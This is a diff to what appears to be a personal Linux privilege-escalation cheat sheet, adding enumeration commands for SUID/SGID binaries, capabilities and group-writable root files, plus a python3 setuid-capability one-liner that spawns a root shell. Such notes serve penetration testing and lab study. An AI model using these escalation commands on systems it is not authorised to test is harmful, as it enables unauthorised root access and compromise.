@@ -52,19 +52,31 @@ Check config files
 
 Permission info
 	`sudo -l` list all commands your user can run using `sudo`
+	Find SUID binaries
+		`find / -perm -u=s -type f 2>/dev/null`
+	Find SGID binaries
+		`find / -perm -g=s -type f 2>/dev/null`
 	Find SUID and SGID binaries
 		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
 		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} + 2> /dev/null|cat`
+		compare to [gtfobins](https://gtfobins.github.io/)
 	Find sticky-bit directories, missing on tmp? (restricted deletion flag - other users can't overwrite/delete files in the dir)
 		`find / -perm -1000 -type d 2>/dev/null`
 	Find writable files
 		`find /etc -writable -ls 2>/dev/null`
 	Find files with permissions for your group (if user has extra groups)
-		`find / -type f -group `mygroup` 2>/dev/null`
+		`find / -type f -group `mygroup` -exec ls -l {} + 2>/dev/null`
 	Find write exec perm directories
 		`find / -perm -o x -type d 2>/dev/null`
 	Find files with capability "permissions"
 		`getcap -r / 2>/dev/null`
+	Find files with root owner, our group and group write permissions
+		`find / -type f -user root -group <your-group> -perm -g=w -exec ls -l {} + 2> /dev/null|cat`
+
+if getcap has suid permissions
+	`setcap cap_setuid+ep ./python3`
+	`getcap -r / 2>/dev/null`
+	`./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
 
 check for ssh keys
 	`/home/<user>/.ssh`
@@ -73,8 +85,7 @@ check for ssh keys
 		writeable /etc/shadow or /etc/passwd
 
 what processes are running
-	`ps aux` show processes for all users (a), display user that launched the process (u), show processes not attached to a terminal (x)
-	`ps ax` can see long commands
+	`ps aux|cat` show processes for all users (a), display user that launched the process (u), show processes not attached to a terminal (x)
 	`ps auxf|cat` can see all the things!!! thanks stderr_dk
 	`ps axjf` tree style (f)
 	`ps axf`
